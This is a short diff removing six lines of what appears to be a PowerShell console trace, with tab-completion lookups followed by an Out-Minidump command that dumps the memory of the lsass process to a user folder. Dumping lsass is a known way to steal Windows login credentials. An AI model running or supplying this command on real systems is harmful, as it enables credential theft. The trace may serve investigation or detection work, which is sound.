@@ -1,6 +1,0 @@
-Resolve-Path -ErrorAction Ignore -WarningAction Ignore -InformationAction Ignore -Verbose False -Debug False -Path get-pr*
-Resolve-Path -ErrorAction Ignore -WarningAction Ignore -InformationAction Ignore -Verbose False -Debug False -Path Get-Proc*
-Resolve-Path -ErrorAction Ignore -WarningAction Ignore -InformationAction Ignore -Verbose False -Debug False -Path Out-mini*
-PSConsoleHostReadLine 
-Out-Minidump -DumpFilePath C:\Users\espsa -Process System.Diagnostics.Process (lsass)
-conhost 0xffffffff -ForceV1
